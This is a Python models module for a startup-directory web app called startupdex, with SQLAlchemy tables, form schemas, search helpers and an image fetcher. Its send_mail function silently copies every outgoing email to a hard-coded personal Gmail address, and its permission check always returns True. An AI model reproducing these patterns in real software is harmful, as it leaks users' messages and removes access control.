from sqlalchemy import (
    Column,
    #Index,
    Integer,
    Float,
    Text,
    Boolean,
    DateTime,
    ForeignKey,
    and_,
    )

from sqlalchemy.dialects.postgresql import (
    array,
    TSVECTOR,
    )

from sqlalchemy.dialects import postgresql
from sqlalchemy import select, func

from sqlalchemy.orm import (
    scoped_session,
    sessionmaker,
    relationship,
    )

from sqlalchemy.ext.declarative import declarative_base


from zope.sqlalchemy import ZopeTransactionExtension

import re
import datetime
import os
import math

DBSession = scoped_session(sessionmaker(extension=ZopeTransactionExtension()))
Base = declarative_base()

DATETIME_FORMAT = '%Y%m%d%H%M%S'

import colander
from PIL import Image

#from peewee import *
#from playhouse.sqlite_ext import *
#from playhouse.apsw_ext import APSWDatabase
#ftsdb = SqliteExtDatabase('/var/www/startupdex/startupdex_fts.sqlite', threadlocals=True)
#ftsdb = APSWDatabase('/var/www/startupdex/startupdex_fts.sqlite', threadlocals=True)

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate
from email.encoders import encode_base64

def send_mail(to, fro, subject, text, html, files=[],server="localhost"):
    assert type(to)==list
    assert type(files)==list


    msg = MIMEMultipart()
    msg['From'] = fro
    msg['To'] = COMMASPACE.join(to)
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = subject

    msg.attach( MIMEText(text, 'plain') )
    msg.attach( MIMEText(html, 'html') )


    for file in files:
        part = MIMEBase('application', "octet-stream")
        part.set_payload( open(file,"rb").read() )
        encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename="%s"'
                        % os.path.basename(file))
        msg.attach(part)

    smtp = smtplib.SMTP(server)
    smtp.sendmail(fro, to, msg.as_string() )
    smtp.sendmail(fro, "mr.gronka@gmail.com", msg.as_string() )
    smtp.close()

# Example:
#send_mail(['Taylor Gronka <mr.gronka@gmail.com>'],'GentleBud <yourbud.com>','Hello Python!','Heya buddy! Say hello to Python! :)', [])


def write_basic_image(image, image_dir, imagename):
    d = os.path.dirname(image_dir)
    try:
        os.stat(d)
    except:
        os.mkdir(d)
    image_path = image_dir + imagename
    file_path = os.path.join(image_path)
    open(file_path, 'wb').write(image.file.read())

    maxsize = 350, 350
    im = Image.open(file_path)
    im.thumbnail(maxsize, Image.ANTIALIAS)
    try:
        im.save(file_path)
    except OSError as e:
        print(e)
        print("failed to determine image type")


def update_fts_startups(startup):
    doc = startup.name + " " + startup.short_info + " " + startup.about
    DBSession.execute("INSERT INTO fts_startups (startupdex_id, doc, name, short_info, logo_url) VALUES (?, ?, ?, ?, ?)",
                      startup.id,
                      doc,
                      startup.name,
                      startup.short_info,
                      startup.logo_url)
    print("++++++++++++++++")
    print(doc)


def startup_search(text):
    #result = DBSession.execute("""WITH q AS (SELECT to_tsquery("{text}") AS query), ranked AS (
        #SELECT id, doc, ts_rank_cd(tsv, query) AS rank
        #FROM fts_startups, query WHERE q.query @@ tsv ORDER BY rank DESC LIMIT 10 )
        #SELECT id, ts_headline(doc, q.query) FROM ranked, q ORDER BY ranked DESC;""".format(text=text))
    #print(str(result))
    #result = DBSession.execute("SELECT * FROM startups WHERE fts @@ to_tquery(?)")
    #result = DBSession.query(Startup).select([fts.match(text)])
    print("==============================================================================")
    print(text)
    terms = "','".join(text.split(' '))
    s = select([Startup.id,
                Startup.name,
                Startup.logo_url,
                Startup.local_url,
                Startup.short_info,
                Startup.about
                ]).where(
        Startup.fts.match(terms)
    )
    results = DBSession.execute(s)
    results = results.fetchall()

    l = []
    pos = 0
    for row in results:
        l.append({})
        l[pos] = dict(row.items())
        pos += 1

    return l


def name_to_local_url(name):
    s = name.lower()
    return re.sub('[^0-9a-zA-Z]+', '-', s)

def title_to_local_url(title):
    s = title.lower()
    return re.sub('[^0-9a-zA-Z]+', '-', s)

def user_has_permission(user, permission):
    return True


def add_startup_has_category(startupid, categoryid):
    # exit the function if the relationship already exists
    if DBSession.query(StartupHasCategories).filter(and_(
        StartupHasCategories.categoryid == categoryid,
        StartupHasCategories.startupid == startupid)).count() > 0:
        return False

    start_has_cat = StartupHasCategories(startupid=startupid,
                                       categoryid=categoryid)
    DBSession.add(start_has_cat)
    category = DBSession.query(Category).filter(Category.id == categoryid).first()
    category.num_startups += 1
    return True


def rem_startup_has_category(startupid, categoryid):
    start_has_cat = DBSession.query(StartupHasCategories).filter(and_(
                                    StartupHasCategories.categoryid == categoryid,
                                    StartupHasCategories.startupid == startupid)).first()
    # exit function if row does not exist to be removed
    if start_has_cat is None:
        return False
    DBSession.delete(start_has_cat)
    category = DBSession.query(Category).filter(Category.id == categoryid).first()
    category.num_startups -= 1
    return True


class EditUserSchema(colander.MappingSchema):
    email = colander.SchemaNode(colander.String(), missing=None)
    fullname = colander.SchemaNode(colander.String(), missing=None)
    status = colander.SchemaNode(colander.String(), missing=None)
    location = colander.SchemaNode(colander.String(), missing=None)
    country = colander.SchemaNode(colander.String(), missing=None)
    state_province = colander.SchemaNode(colander.String(), missing=None)
    city = colander.SchemaNode(colander.String(), missing=None)
    local_url = colander.SchemaNode(colander.String(), missing=None)
    home_url = colander.SchemaNode(colander.String(), missing=None)
    twitter_url = colander.SchemaNode(colander.String(), missing=None)
    blog_url = colander.SchemaNode(colander.String(), missing=None)
    facebook_url = colander.SchemaNode(colander.String(), missing=None)

class RegisterUserSchema(colander.MappingSchema):
    email = colander.SchemaNode(colander.String(), validator=colander.Email())
    password = colander.SchemaNode(colander.String())
    fullname = colander.SchemaNode(colander.String())
    phone = colander.SchemaNode(colander.String(), missing=None)
    company = colander.SchemaNode(colander.String(), missing=None)

class CreateStartupSchema(colander.MappingSchema):
    name = colander.SchemaNode(colander.String())
    #userid_creator = colander.SchemaNode(colander.Integer())
    country = colander.SchemaNode(colander.String())
    postal_code = colander.SchemaNode(colander.String())
    state_province = colander.SchemaNode(colander.String())
    city = colander.SchemaNode(colander.String())
    street_address = colander.SchemaNode(colander.String(), missing=None)
    contact_email = colander.SchemaNode(colander.String(), verifier=colander.Email())
    tags = colander.SchemaNode(colander.String(), missing=None)
    about = colander.SchemaNode(colander.String())
    short_info = colander.SchemaNode(colander.String())
    company_size = colander.SchemaNode(colander.String())


class ModifyStartupSchema(colander.MappingSchema):
    name = colander.SchemaNode(colander.String())
    local_url = colander.SchemaNode(colander.String())
    tags = colander.SchemaNode(colander.String(), missing=None)
    company_size = colander.SchemaNode(colander.String())
    short_info = colander.SchemaNode(colander.String())
    about = colander.SchemaNode(colander.String())


class ModifySocialSchema(colander.MappingSchema):
    contact_email = colander.SchemaNode(colander.String(), verifier=colander.Email())
    contact_phone = colander.SchemaNode(colander.String(), missing=None)
    home_url = colander.SchemaNode(colander.String(), missing=None)
    blog_url = colander.SchemaNode(colander.String(), missing=None)
    facebook_url = colander.SchemaNode(colander.String(), missing=None)
    twitter_url = colander.SchemaNode(colander.String(), missing=None)
    country = colander.SchemaNode(colander.String())
    postal_code = colander.SchemaNode(colander.String())
    state_province = colander.SchemaNode(colander.String())
    city = colander.SchemaNode(colander.String())
    street_address = colander.SchemaNode(colander.String(), missing=None)


class CreateArticleSchema(colander.MappingSchema):
    #userid_creator = colander.SchemaNode(colander.Integer())
    about = colander.SchemaNode(colander.String())
    title = colander.SchemaNode(colander.String())
    lead_text = colander.SchemaNode(colander.String(), missing=None)
    tags = colander.SchemaNode(colander.String(), missing=None)
    story = colander.SchemaNode(colander.String())


class ModifyArticleSchema(colander.MappingSchema):
    #userid_creator = colander.SchemaNode(colander.Integer())
    about = colander.SchemaNode(colander.String())
    title = colander.SchemaNode(colander.String())
    lead_text = colander.SchemaNode(colander.String(), missing=None)
    tags = colander.SchemaNode(colander.String(), missing=None)
    story = colander.SchemaNode(colander.String())

class LoginSchema(colander.MappingSchema):
    email = colander.SchemaNode(colander.String())
    password = colander.SchemaNode(colander.String())

#class Entry(Model):
    #title = CharField()
    #content = TextField()


    #class Meta:
        #database = ftsdb


#class FTSEntry(FTSModel):
    #entry = ForeignKeyField(Entry, primary_key=True)
    #content = TextField()


    #class Meta:
        #database = ftsdb


#class FTSStartup(FTSModel):
    ## id is implicit
    #startupdex_id = TextField()
    #angelco_id = TextField()
    #name = TextField()
    #content = TextField()
    #quick_info = TextField()
    #short_info = TextField()
    #thumb_url = TextField()
    #ranking = TextField()


    #class Meta:
        #database = ftsdb


#class FTSUser(FTSModel):
    #user_id = TextField()
    #fullname = TextField()
    #about = TextField()
    #thumb_url = TextField()
    #content = TextField()

# this function is meant for correcting empty fields so they are properly
# committed to the postgresql database
def fix_integer_fields(db_dict):
    integer_fields = ("id",
                "hidden",
                "community_profile",
                "quality",
                "follower_count",
                "angelco_quality",
                "angelco_follower_count",
                "company_size",
                "company_status",
                )
    for field in integer_fields:
        if field in db_dict:
            if db_dict[field] == "":
                db_dict[field] = 0
            elif db_dict[field] is True:
                db_dict[field] = 1

def get_images_from_angelco(index, thumb_url, logo_url):
    import requests
    import os
    #print(str(index))

    if thumb_url == "https://angel.co/images/shared/nopic_startup.png":
        thumb_url = logo_url
    if logo_url == "https://angel.co/images/shared/nopic_startup.png":
        return "no_image"

    folder_group = str(int(math.ceil(index / 10000.0) * 10000.0))
    fpath = '/var/www/startupdex/images/startups/thumbs/'+folder_group+'/'
    if not os.path.exists(fpath):
        os.makedirs(fpath)
    try:
        #print(str(thumb_url))
        f = open(fpath+str(index)+'.png', 'wb')
    except ValueError:
        print("thumb_url is undefined for index " + str(index))
    f.write(requests.get(thumb_url).content)
    f.close()
    #reformat
    file_path = fpath + str(index)+'.png'
    maxsize = 350, 350
    im = Image.open(file_path)
    im.thumbnail(maxsize, Image.ANTIALIAS)
    try:
        im.save(file_path)
    except OSError as e:
        print(e)
        print("failed to determine image type")

    fpath = '/var/www/startupdex/images/startups/logos/'+folder_group+'/'
    if not os.path.exists(fpath):
        os.makedirs(fpath)
    try:
        #print(str(logo_url))
        f = open(fpath+str(index)+'.png', 'wb')
    except ValueError:
        print("logo_url is undefined for index " + str(index))
    f.write(requests.get(logo_url).content)
    f.close()
    #reformat
    file_path = fpath + str(index)+'.png'
    maxsize = 350, 350
    im = Image.open(file_path)
    im.thumbnail(maxsize, Image.ANTIALIAS)
    try:
        im.save(file_path)
    except OSError as e:
        print(e)
        print("failed to determine image type")

    #fpath = '/home/taylor/projects/startupdex/startupdex/static/images/startups/logos/'+folder_group+'/'
    #if not os.path.exists(fpath):
        #os.makedirs(fpath)
    #f = open(fpath+str(index)+'.jpg', 'wb')
    #f.write(requests.get(logo_url).content)
    #f.close()
    return "complete"


class UserHasArticles(Base):
    """ The SQLAlchemy declarative model class for the User-Article relationship. """
    __tablename__ = "user_has_articles"
    userid = Column(Integer, ForeignKey("users.id"), primary_key=True)
    articleid = Column(Integer, ForeignKey("articles.id"), primary_key=True)


class StartupHasArticles(Base):
    """ The SQLAlchemy declarative model class for the User-Article relationship. """
    __tablename__ = "startup_has_articles"
    startupid = Column(Integer, ForeignKey("startups.id"), primary_key=True)
    articleid = Column(Integer, ForeignKey("articles.id"), primary_key=True)


class UserHasStartups(Base):
    """ The SQLAlchemy declarative model class for the User-Startup relationship. """
    __tablename__ = "user_has_startups"
    userid = Column(Integer, ForeignKey("users.id"), primary_key=True)
    startupid = Column(Integer, ForeignKey("startups.id"), primary_key=True)


class AngelcomirrorHasStartups(Base):
    """ The SQLAlchemy declarative model class for the AngelCoMirror-Startup relationship. """
    __tablename__ = "angelcomirror_has_startups"
    angelcoid = Column(Integer, ForeignKey("angelcomirror.id"), primary_key=True)
    startupdexid = Column(Integer, ForeignKey("startups.id"), primary_key=True)


class Startup(Base):
    """ The SQLAlchemy declarative model class for a Startup object. """
    __tablename__ = 'startups'
    id = Column(Integer, primary_key=True)
    userid_creator = Column(Integer, ForeignKey("users.id"))
    name = Column(Text)
    status = Column(Text)
    hidden = Column(Boolean)
    locations = Column(Text)
    country = Column(Text)
    postal_code = Column(Text)
    state_province = Column(Text)
    city = Column(Text)
    street_address = Column(Text)
    lat = Column(Float)
    lng = Column(Float)
    tags = Column(Text)
    contact_phone = Column(Text)
    contact_email = Column(Text)
    local_url = Column(Text)
    home_url = Column(Text)
    blog_url = Column(Text)
    facebook_url = Column(Text)
    twitter_url = Column(Text)
    logo_url = Column(Text)
    thumb_url = Column(Text)
    header_info = Column(Text)
    short_info = Column(Text)
    primary_category = Column(Text)
    categories = Column(Text)
    founders = Column(Text)
    about = Column(Text)
    startupdex_ranking = Column(Text)
    angelco_quality = Column(Integer)
    angelco_follower_count = Column(Integer)
    created_at = Column(DateTime, default=datetime.datetime.utcnow)
    updated_at = Column(DateTime, default=datetime.datetime.utcnow)
    angelco_status = Column(Text)
    company_size = Column(Text)
    company_status = Column(Integer)
    fts = Column(TSVECTOR)
    language = Column(Text, default='english')


class FrontpageStartup(Base):
    """ The SQLAlchemy declarative model class for a Frontpage object. """
    __tablename__ = 'frontpage_startups'
    startupid = Column(Integer, ForeignKey("startups.id"), primary_key=True)


class AngelCoMirror(Base):
    __tablename__ = 'angelcomirror'
    id = Column(Integer, primary_key=True)
    startupdexid = Column(Integer)
    hidden = Column(Integer)
    community_profile = Column(Integer)
    name = Column(Text)
    angellist_url = Column(Text)
    logo_url = Column(Text)
    thumb_url = Column(Text)
    quality = Column(Integer)
    product_desc = Column(Text)
    high_concept = Column(Text)
    follower_count = Column(Integer)
    company_url = Column(Text)
    company_size = Column(Text)
    company_type = Column(Text)  # json list
    created_at = Column(DateTime, default=datetime.datetime.utcnow)
    updated_at = Column(DateTime, default=datetime.datetime.utcnow)
    twitter_url = Column(Text)
    facebook_url = Column(Text)
    linkedin_url = Column(Text)
    blog_url = Column(Text)
    crunchbase_url = Column(Text)
    video_url = Column(Text)
    markets = Column(Text)  # json list
    locations = Column(Text)  # json list
    status = Column(Text)  # json object
    screenshots = Column(Text)  # json list
    launch_date = Column(DateTime, default=datetime.datetime.utcnow)
    fundraising = Column(Text)


class Password(Base):
    __tablename__ = "passwords"
    id = Column(Integer, primary_key=True)
    userid = Column(Integer, ForeignKey('users.id'), unique=True)
    password = Column(Text)
    salt1 = Column(Text)
    salt2 = Column(Text)
    version = Column(Integer)


class User(Base):
    __tablename__ = "users"
    id = Column(Integer, primary_key=True)
    email = Column(Text)
    password = relationship("Password", uselist=False, backref="users")
    fullname = Column(Text)
    phone = Column(Text)
    confirmed = Column(Boolean, default=False)
    join_date = Column(DateTime, default=datetime.datetime.utcnow)
    last_login = Column(DateTime, default=datetime.datetime.utcnow)
    tz = Column(Text)
    tzoffset = Column(Text)
    status = Column(Text)
    about = Column(Text)
    # replace location with search_locs?
    location = Column(Text)
    country = Column(Text)
    postal_code = Column(Text)
    state_province = Column(Text)
    city = Column(Text)
    street_address = Column(Text)
    thumb_url = Column(Text)
    photo_url = Column(Text)
    local_url = Column(Text)
    home_url = Column(Text)
    blog_url = Column(Text)
    linkedin_url = Column(Text)
    facebook_url = Column(Text)
    twitter_url = Column(Text)


#class UserToCompanies(Base):
    #__tablename__ = "user_to_companies"



# probably don't need this, but it's interesting
class NotLoggedUser(User):
    id = None
    username = None
    password = None


class Article(Base):
    __tablename__ = "articles"
    id = Column(Integer, primary_key=True)
    startupdexid = Column(Integer, ForeignKey('startups.id'))
    authorid = Column(Integer, ForeignKey('users.id'))
    author_name = Column(Text)
    title = Column(Text)
    subtitle = Column(Text)
    lead_text = Column(Text)
    story = Column(Text)
    local_url = Column(Text)
    tags = Column(Text)
    date_published = Column(DateTime, default=datetime.datetime.utcnow)
    date_edited = Column(DateTime, default=datetime.datetime.utcnow)
    photo_url = Column(Text)
    header_image = Column(Text)
    other_images = Column(Text)


#Index('my_index', MyModel.name, unique=True, mysql_length=255)


class Category(Base):
    """ The SQLAlchemy declarative model class for a Category object. """
    __tablename__ = 'categories'
    id = Column(Integer, primary_key=True)
    name = Column(Text)
    local_url = Column(Text)
    popularity = Column(Integer)
    num_startups = Column(Integer)


class StartupHasCategories(Base):
    """ The SQLAlchemy declarative model class for the Startup-Category relationship. """
    __tablename__ = "startup_has_categories"
    startupid = Column(Integer, ForeignKey("startups.id"), primary_key=True)
    categoryid = Column(Integer, ForeignKey("categories.id"), primary_key=True)
